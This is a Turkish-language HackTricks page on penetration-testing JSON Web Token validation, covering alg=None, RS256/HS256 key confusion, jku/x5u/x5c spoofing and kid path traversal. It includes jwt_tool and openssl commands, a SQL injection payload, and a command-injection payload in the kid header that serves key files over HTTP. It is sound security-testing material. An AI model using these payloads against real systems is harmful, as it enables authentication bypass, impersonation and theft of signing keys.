# JWT Güvenlik Açıkları (Json Web Token'lar)

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 **Discord grubuna** katılın](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'u takip edin.
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Eğer **hacking kariyeri**ne ilgi duyuyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı şekilde Lehçe yazılı ve konuşma gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

**Bu yazının bir kısmı şu harika yazıya dayanmaktadır:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**JWT'leri pentest etmek için harika bir araç olanın yazarı** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Hızlı Kazanımlar**

[**jwt\_tool**](https://github.com/ticarpi/jwt\_tool)'u `Tüm Testler!` modunda çalıştırın ve yeşil satırları bekleyin
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Eğer şanslıysanız, araç JWT'yi yanlış şekilde kontrol eden web uygulamasının bazı durumlarını bulabilir:

![](<../.gitbook/assets/image (435).png>)

Daha sonra, proxy'nizde isteği arayabilir veya jwt_tool'u kullanarak o istek için kullanılan JWT'yi dump edebilirsiniz:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### Veriye hiçbir şey değiştirmeden veriyi değiştirin

Sadece veriyi değiştirerek imzayı aynı bırakabilir ve sunucunun imzayı kontrol edip etmediğini kontrol edebilirsiniz. Örneğin, kullanıcı adınızı "admin" olarak değiştirmeyi deneyin.

#### **Token kontrol ediliyor mu?**

Bir JWT'nin imzasının doğrulandığını kontrol etmek için:

* Bir hata mesajı doğrulamanın devam ettiğini gösterir; ayrıntılı hatalardaki hassas bilgiler incelenmelidir.
* Dönen sayfada bir değişiklik doğrulamayı gösterir.
* Herhangi bir değişiklik olmaması doğrulamanın olmadığını gösterir; bu durumda veri yükü iddialarını değiştirmek için denemeler yapılmalıdır.

### Köken

Token'ın sunucu tarafından mı yoksa istemci tarafından mı oluşturulduğunu belirlemek önemlidir, bunu proxy'nin istek geçmişini inceleyerek yapabilirsiniz.

* İlk kez istemci tarafından görülen token'lar, anahtarın istemci tarafı koduna maruz kalabileceğini gösterir, daha fazla inceleme gerektirir.
* Sunucu tarafından kaynaklanan token'lar güvenli bir süreci işaret eder.

### Süre

Token'ın 24 saatten fazla sürüp sürmediğini kontrol edin... belki hiç süresi dolmuyordur. "exp" alanı varsa, sunucunun bunu doğru şekilde işleyip işlemediğini kontrol edin.

### HMAC gizli anahtarını kaba kuvvetle çözme

[**Bu sayfaya bakın.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Algoritmayı None olarak değiştirme (CVE-2015-9235)

Kullanılan algoritmayı "None" olarak ayarlayın ve imza kısmını kaldırın.

Bu zafiyeti denemek ve JWT içinde farklı değerleri değiştirmek için Burp uzantısını "JSON Web Token" olarak kullanın (istemi Repeater'a gönderin ve "JSON Web Token" sekmesinde token'ın değerlerini değiştirebilirsiniz. Ayrıca "Alg" alanının değerini "None" olarak seçebilirsiniz).

### Algoritmayı RS256(asimetrik) den HS256(simetrik) olarak değiştirme (CVE-2016-5431/CVE-2016-10555)

HS256 algoritması, her mesajı imzalamak ve doğrulamak için gizli anahtarı kullanır.\
RS256 algoritması, mesajı imzalamak için özel anahtarı kullanır ve doğrulama için genel anahtarı kullanır.

Algoritmayı RS256'dan HS256'ya değiştirirseniz, arka uç kod genel anahtarı gizli anahtar olarak kullanır ve ardından imzayı doğrulamak için HS256 algoritmasını kullanır.

Daha sonra genel anahtarı kullanarak RS256'yı HS256'ya değiştirerek geçerli bir imza oluşturabiliriz. Bu işlemi gerçekleştirmek için web sunucusunun sertifikasını alabilirsiniz.
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Başlık içinde yeni genel anahtar

Bir saldırgan, belirtecin başlığına yeni bir anahtar yerleştirir ve sunucu bu yeni anahtarı imzayı doğrulamak için kullanır (CVE-2018-0114).

Bu, "JSON Web Tokens" Burp eklentisi ile yapılabilir.\
(İsteği Repeater'a gönderin, JSON Web Token sekmesinde "CVE-2018-0114"ü seçin ve isteği gönderin).

### JWKS Sahteciliği

Talimatlar, JWT belgelerinin güvenliğini değerlendirmek için bir yöntemi detaylandırır, özellikle "jku" başlığını kullananları. Bu belirteç, belgenin doğrulanması için gerekli genel anahtarı içeren bir JWKS (JSON Web Key Set) dosyasına bağlanmalıdır.

* **"jku" Başlığıyla Belge Değerlendirme**:
* "jku" belirtecinin URL'sini doğrulayarak, uygun JWKS dosyasına yönlendirdiğinden emin olun.
* Belgenin "jku" değerini kontrol edilen bir web hizmetine yönlendirmek için değiştirin, böylece trafiği gözlemleyebilirsiniz.
* **HTTP Etkileşimi İçin İzleme**:
* Belirtilen URL'ye yapılan HTTP isteklerini gözlemlemek, sunucunun sağlanan bağlantıdan anahtarları almaya çalıştığını gösterir.
* Bu işlem için `jwt_tool` kullanırken, testi kolaylaştırmak için `jwtconf.ini` dosyasını kişisel JWKS konumunuzla güncellemek önemlidir.
* **`jwt_tool` için Komut**:
*   Aşağıdaki komutu çalıştırarak `jwt_tool` ile senaryoyu simüle edin:

```bash
python3 jwt_tool.py JWT_BURAYA -X s
```

### Kid Sorunları Genel Bakış

Bir belirtilmeyen başlık belirtmesi olan `kid` olarak bilinen isteğe bağlı bir belirteç, belirli bir anahtarı tanımlamak için kullanılır, bu özellikle belirtecin imzasını doğrulamak için birden fazla anahtarın bulunduğu ortamlarda önemli hale gelir. Bu belirteç, bir belgenin imzasını doğrulamak için uygun anahtarı seçmede yardımcı olur.

#### "kid" ile Anahtarı Açığa Çıkarma

`kid` belirteci başlıkta bulunduğunda, karşılık gelen dosyayı veya varyasyonlarını aramak için web dizininde arama yapılması önerilir. Örneğin, `"kid":"key/12345"` belirtilmişse, _/key/12345_ ve _/key/12345.pem_ dosyaları web kökünde aranmalıdır.

#### "kid" ile Yol Geçişi

`kid` belirteci, dosya sistemi üzerinden gezinmek için de kullanılabilir ve bu, belirli dosyaları hedeflemek için `kid` değerini değiştirerek bağlantı testi yapılmasına veya Sunucu Tarafı İstek Sahteciliği (SSRF) saldırıları gerçekleştirmeye olanak tanır. JWT'yi değiştirerek `kid` değerini değiştirmek ve orijinal imzayı korumak, jwt\_tool'da `-T` bayrağını kullanarak aşağıda gösterildiği gibi başarılabilir:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Hedeflenen dosyaların tahmin edilebilir içeriği ile, geçerli bir JWT oluşturmak mümkündür. Örneğin, Linux sistemlerindeki `/proc/sys/kernel/randomize_va_space` dosyası, içerdiği **2** değeri ile JWT oluşturulurken `kid` parametresinde **2** olarak kullanılabilir.

#### "kid" Üzerinden SQL Enjeksiyonu

Eğer `kid` iddiasının içeriği bir veritabanından bir şifre almak için kullanılıyorsa, `kid` yükünü değiştirerek SQL enjeksiyonu kolaylaştırılabilir. JWT imzalama sürecini değiştirmek için SQL enjeksiyonu kullanan bir örnek yük şunları içerir:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Bu değişiklik, JWT imzalama için bilinen gizli anahtar olan `ATTACKER`'ın kullanılmasını zorlar.

#### "kid" Üzerinden OS Enjeksiyonu

`kid` parametresinin bir komut yürütme bağlamında kullanılan bir dosya yolunu belirttiği bir senaryo, Uzaktan Kod Yürütme (RCE) güvenlik açıklarına yol açabilir. `kid` parametresine komutlar enjekte edilerek, özel anahtarlar açığa çıkarılabilir. RCE ve anahtarın açığa çıkarılması için bir örnek yük şudur:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u ve jku

#### jku

jku, **JWK Set URL**'nin kısaltmasıdır.\
Eğer token bir "**jku**" **Header** iddiası kullanıyorsa, **sağlanan URL'yi kontrol edin**. Bu, belirtilen URL'yi içeren JWKS dosyasını işaret etmelidir ki bu dosya, token'ı doğrulamak için kullanılan Genel Anahtarı içermelidir. Trafik izleyebileceğiniz bir web hizmetine jku değerini işaret edecek şekilde token'ı değiştirin.

İlk olarak, yeni özel ve genel anahtarlar içeren yeni bir sertifika oluşturmanız gerekmektedir.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Sonra örneğin [**jwt.io**](https://jwt.io) kullanarak **oluşturulan genel ve özel anahtarlarla yeni JWT oluşturabilir ve jku parametresini oluşturulan sertifikaya işaret edecek şekilde ayarlayabilirsiniz.** Geçerli bir jku sertifikası oluşturmak için orijinalini indirip gerekli parametreleri değiştirebilirsiniz.

"e" ve "n" parametrelerini bir genel sertifikadan alabilirsiniz:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. PEM formunda kodlanmış X.509 (bir sertifika format standardı) genel sertifikalar kümesine işaret eden bir URI. Kümedeki ilk sertifika bu JWT'yi imzalamak için kullanılan sertifikadır. Ardışık sertifikalar birbirini imzalar, böylece sertifika zinciri tamamlanmış olur. X.509, RFC 5280'de tanımlanmıştır. Sertifikaların transfer edilmesi için taşıma güvenliği gereklidir.

Bu başlığı **kendi kontrolünüzdeki bir URL'ye değiştirmeyi deneyin** ve herhangi bir istek alınıp alınmadığını kontrol edin. Bu durumda JWT'yi **manipüle edebilirsiniz**.

Kendi kontrolünüzdeki bir sertifika kullanarak yeni bir belirteç oluşturmak için, sertifikayı oluşturmanız ve genel ve özel anahtarları çıkarmanız gerekmektedir:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Ardından örneğin [**jwt.io**](https://jwt.io) kullanarak yeni JWT'yi oluşturabilirsiniz, **oluşturulan genel ve özel anahtarları kullanarak ve x5u parametresini oluşturulan .crt sertifikasına işaret edecek şekilde.**

![](<../.gitbook/assets/image (439).png>)

Ayrıca bu zafiyetleri **SSRF'ler için kötüye kullanabilirsiniz**.

#### x5c

Bu parametre **base64 formatında sertifikayı** içerebilir:

![](<../.gitbook/assets/image (440).png>)

Saldırgan, **kendi kendine imzalı bir sertifika oluşturursa** ve ilgili özel anahtarı kullanarak sahte bir belge oluşturur ve "x5c" parametresinin değerini yeni oluşturulan sertifikayla değiştirir ve diğer parametreleri, yani n, e ve x5t'yi değiştirirse, aslında sahte belge sunucu tarafından kabul edilecektir.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Gömülü Genel Anahtar (CVE-2018-0114)

Eğer JWT aşağıdaki senaryoda olduğu gibi bir genel anahtarı gömülüyse:

![](<../.gitbook/assets/image (438).png>)

Aşağıdaki nodejs betiği kullanılarak bu verilerden bir genel anahtar oluşturulabilir:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="​ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"​;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Yeni bir özel/genel anahtar oluşturmak, yeni genel anahtarı belirteci içine gömmek ve yeni bir imza oluşturmak mümkündür:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Bu Node.js betiği kullanarak "n" ve "e" değerlerini elde edebilirsiniz:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
### JTI (JWT Kimliği)

JTI (JWT Kimliği) iddiası, bir JWT Jetonu için benzersiz bir tanımlayıcı sağlar. Jetonun tekrarlanmasını önlemek için kullanılabilir.\
Ancak, ID'nin maksimum uzunluğunun 4 (0001-9999) olduğu bir durumu hayal edin. İstek 0001 ve 10001 aynı kimliği kullanacak. Bu nedenle, backend her istekte kimliği artırıyorsa, bu durumu isteğin tekrarlanması için kötüye kullanabilirsiniz (her başarılı tekrar oynatma arasında 10000 istek göndermek gerekebilir).

### JWT Kayıtlı iddiaları

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Diğer saldırılar

**Çapraz Hizmet Röle Saldırıları**

Bazı web uygulamalarının, jetonlarının oluşturulması ve yönetimi için güvenilir bir JWT hizmetine güvendiği gözlemlenmiştir. Bir JWT hizmeti tarafından bir istemci için oluşturulan bir jetonun, aynı JWT hizmetinin başka bir istemcisi tarafından kabul edildiği kaydedilmiştir. Üçüncü taraf bir hizmet aracılığıyla bir JWT'nin verilmesi veya yenilenmesi gözlemlenirse, aynı kullanıcı adı/e-posta ile başka bir hizmetin hesabına kaydolma olasılığı araştırılmalıdır. Ardından, elde edilen jetonun hedefe bir istekte tekrarlanmaya çalışılmalıdır.

* Jetonunuzun kabul edilmesi, herhangi bir kullanıcının hesabının sahteciliğine izin verebilecek kritik bir sorunu işaret edebilir. Ancak, üçüncü taraf bir uygulamaya kaydolmak için daha geniş test izni gerekebileceği unutulmamalıdır, çünkü bu durum yasal bir belirsizlik alanına girebilir.

**Jetonların Süresi Kontrolü**

Jetonun süresi, "exp" Yük iddiası kullanılarak kontrol edilir. JWT'ler genellikle oturum bilgisi olmadan kullanıldığından dikkatli bir işlem gereklidir. Birçok durumda, başka bir kullanıcının JWT'sini yakalayıp tekrar oynatmak, o kullanıcının taklit edilmesine olanak tanıyabilir. JWT RFC'si, JWT tekrar oynatma saldırılarını azaltmak için jetona bir son kullanma zamanı belirlemek için "exp" iddiasını kullanmayı önermektedir. Ayrıca, uygulamanın bu değerin işlenmesini ve süresi dolmuş jetonların reddedilmesini sağlamak için ilgili kontrolleri uygulaması önemlidir. Jetonun "exp" iddiasını içeriyorsa ve test süre sınırlarına izin veriyorsa, jetonun saklanması ve süresi dolduktan sonra tekrar oynatılması önerilir. Jetonun içeriği, jwt_tool'un -R bayrağını kullanarak okunabilir, zaman damgası ayrıştırma ve süresi kontrol etme (zaman damgası UTC'de) dahil.

* Uygulamanın hala jetonu doğrulaması durumunda bir güvenlik riski olabilir, çünkü bu, jetonun hiçbir zaman süresinin dolmayacağını ima edebilir.

### Araçlar

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Eğer **hacking kariyeri**ne ilgi duyuyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı şekilde yazılı ve konuşma yapabilme gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na bakın(https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşın, PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>
